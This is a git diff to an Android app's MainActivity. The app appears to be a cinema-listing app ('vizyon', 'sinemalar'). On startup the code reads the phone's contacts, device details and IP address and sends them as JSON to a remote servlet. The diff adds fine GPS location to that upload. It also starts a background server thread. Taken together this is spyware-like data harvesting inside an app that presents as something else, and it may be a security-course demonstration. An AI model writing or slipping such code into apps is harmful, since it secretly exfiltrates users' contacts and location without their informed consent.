@@ -3,15 +3,12 @@ package com.csec.vizyon;
 import android.Manifest;
 import android.app.Activity;
 import android.content.ContentResolver;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.util.Log;
-import android.util.Log;
-import android.view.KeyEvent;
 import android.widget.ListView;
 import android.widget.Toast;
 
@@ -46,6 +43,7 @@ public class MainActivity extends AppCompatActivity {
     JSONObject data = new JSONObject();
     JSONArray contactsJson = new JSONArray();
     JSONObject utilsJson = new JSONObject();
+    JSONObject gpsJson = new JSONObject();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -69,48 +67,62 @@ public class MainActivity extends AppCompatActivity {
         new ServerThread().start();
 
         context = this;
-        checkIfPermissonExists();   //For Android 6.0
+        checkIfPermissonExists();
 
         Utils utils = new Utils(context);
-        utilsJson = utils.getUtils();
+        utilsJson = utils.getUtils();   //Permission error for Android 6.0
         //new Tickets().getTickets(context);
 
         try {
             data.put("ip", ip);
+            data.put("gps", gpsJson);
             data.put("utils", utilsJson);
             data.put("contacts", contactsJson);
         } catch (JSONException e) {
             e.printStackTrace();
         }
 
+        //this request is async so you will have to execute this after every parsing operation is finished.
         new Request().execute("http://" + serverIp + ":8080/Csec/Servlet", data.toString());
-
-
+        Log.i(TAG_MAIN, data.toString());
     }
 
-    final private int REQUEST_CODE_ASK_PERMISSIONS = 123;
+    final private int REQUEST_CODE_ASK_PERMISSIONS_CONTACT = 123;
+    final private int REQUEST_CODE_ASK_PERMISSIONS_GPS = 124;
     private void checkIfPermissonExists() {
         int hasWriteContactsPermission = 0;
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+        int hasGPSPermission = 0;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { //Android 6.0
 
             hasWriteContactsPermission = checkSelfPermission(Manifest.permission.READ_CONTACTS);
+
             if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[] {Manifest.permission.READ_CONTACTS}, REQUEST_CODE_ASK_PERMISSIONS);
-                return;
+                requestPermissions(new String[] {Manifest.permission.READ_CONTACTS}, REQUEST_CODE_ASK_PERMISSIONS_CONTACT);
+                //return;
             }
             else {
                 readContacts();
             }
+
+            hasGPSPermission = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);
+            if(hasGPSPermission != PackageManager.PERMISSION_GRANTED){
+                requestPermissions(new String[] {Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_CODE_ASK_PERMISSIONS_GPS);
+                //return;
+            }
+            else {
+                readGPS();
+            }
         }
-        else {
+        else {  // Android Version < Android 6.0
             readContacts();
+            readGPS();
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         switch (requestCode) {
-            case REQUEST_CODE_ASK_PERMISSIONS:
+            case REQUEST_CODE_ASK_PERMISSIONS_CONTACT:
                 if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     // Permission Granted
                     readContacts();
@@ -119,6 +131,14 @@ public class MainActivity extends AppCompatActivity {
                     Toast.makeText(MainActivity.this, "READ_CONTACTS Denied", Toast.LENGTH_SHORT).show();
                 }
                 break;
+            case REQUEST_CODE_ASK_PERMISSIONS_GPS:
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    // Permission Granted
+                    readGPS();
+                } else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "ACCESS_FINE_LOCATION Denied", Toast.LENGTH_SHORT).show();
+                }
             default:
                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         }
@@ -129,6 +149,16 @@ public class MainActivity extends AppCompatActivity {
         ContentResolver contentResolver = getContentResolver();
         Contacts contacts= new Contacts(contentResolver);
         contactsJson = contacts.getAllContacts();
+    }
+
+    public void readGPS(){
+        GPSTracker gps = new GPSTracker(MainActivity.this);
+        if(gps.canGetLocation()) {
+
+            gpsJson = gps.getGps();
+
+            Toast.makeText(getApplicationContext(),gpsJson.toString(), Toast.LENGTH_LONG).show();
+        }
     }
 
     //getting sinemalar content
